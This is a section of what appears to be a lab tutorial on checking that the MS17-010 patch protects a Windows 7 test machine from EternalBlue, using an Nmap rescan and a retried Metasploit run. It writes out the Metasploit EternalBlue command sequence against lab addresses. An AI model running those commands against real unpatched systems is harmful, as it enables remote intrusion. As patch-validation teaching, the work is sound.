# 05. Security Patch Validation 🔐

This section verifies whether applying Microsoft’s official  
**MS17-010 security patch** successfully protects Windows 7  
from the **EternalBlue exploit**.  
Patch validation is a crucial step in any vulnerability assessment. ✔️

---

## 1. Objective 🎯

- Apply the MS17-010 patch to Windows 7  
- Rescan the system to confirm vulnerability is removed  
- Attempt exploitation again to verify the patch blocks the attack  
- Demonstrate the effectiveness of system updates  

---

## 2. Installing the Security Patch 🧩

Microsoft released the patch under:

KB4012212 / KB4012215

### 2.1 Installation Steps
1. Download the correct patch version (based on x86/x64)  
2. Run the installer  
3. Restart the Windows 7 system  
4. Verify the patch appears in installed updates  

### 2.2 Verification  
Go to:  
Control Panel → Windows Update → View Installed Updates

Look for:  
✔ **KB4012212**  
or  
✔ **KB4012215**

If present → Patch successfully installed.

---

## 3. Post-Patch Vulnerability Scan 🔍

After patching, run the Nmap MS17-010 scan again:

nmap --script smb-vuln-ms17-010 -p445 192.168.56.10


### Expected Output (PATCHED) 🛡
Host is NOT vulnerable to MS17-010
This confirms the vulnerability has been removed.

---

## 4. Reattempting Exploitation 💣

Now try running EternalBlue again in Metasploit:

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.10
set LHOST 192.168.56.20
run


### Expected Result After Patch ❌

- Exploit fails  
- No Meterpreter session  
- SMB returns error codes indicating patch applied  

Typical failure message:

Exploit failed: The target is not exploitable

This shows the patch successfully mitigated the attack.

---

## 5. Network Behavior After Patch 📡

Using Wireshark:

- SMBv1 negotiation changes  
- No malicious payload injection  
- No buffer overflow attempts succeed  
- Error packets indicate patch enforcement  

This provides proof at packet level.

---

## 6. Patch Impact Assessment 📊

### Benefits After Applying Patch:
- ✔ EternalBlue blocked  
- ✔ Remote Code Execution prevented  
- ✔ SMBv1 exploit attempts fail  
- ✔ System stability improved  
- ✔ Overall risk significantly reduced  

### Remaining Risks:
- SMBv1 may still be enabled  
- Other vulnerabilities may exist  
- System remains outdated (Windows 7 is EOL)  
- User behavior or misconfigurations can still expose risks  

---

## 7. Conclusion 📝

Applying the **MS17-010 patch** successfully protected the Windows 7 system  
from the EternalBlue exploit. The vulnerability scan confirmed the system is  
no longer exposed, and exploitation attempts failed after patching.

This clearly demonstrates the importance of:

- Installing updates regularly  
- Monitoring vulnerability announcements  
- Maintaining secure configurations  

The next section discusses best practices and mitigation steps.
